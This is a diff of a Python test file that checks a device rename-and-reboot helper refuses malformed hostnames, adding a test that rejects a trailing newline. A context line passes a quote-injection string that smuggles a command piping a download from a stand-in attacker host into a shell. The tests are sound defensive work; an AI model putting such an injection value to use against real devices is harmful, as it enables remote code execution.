@@ -155,3 +155,10 @@ def test_rename_refuses_single_quote_injection():
     r = _recorder()
     assert rename_and_reboot("10.42.0.194", "a'; curl evil|sh; echo '", runner=r).ok is False
     assert r.calls == []
+
+
+def test_rename_refuses_trailing_newline():
+    """`$` は末尾改行の直前でもマッチするため、'pizero2w-3\\n' が通っていた。"""
+    r = _recorder()
+    assert rename_and_reboot("10.42.0.194", "pizero2w-3\n", runner=r).ok is False
+    assert r.calls == []
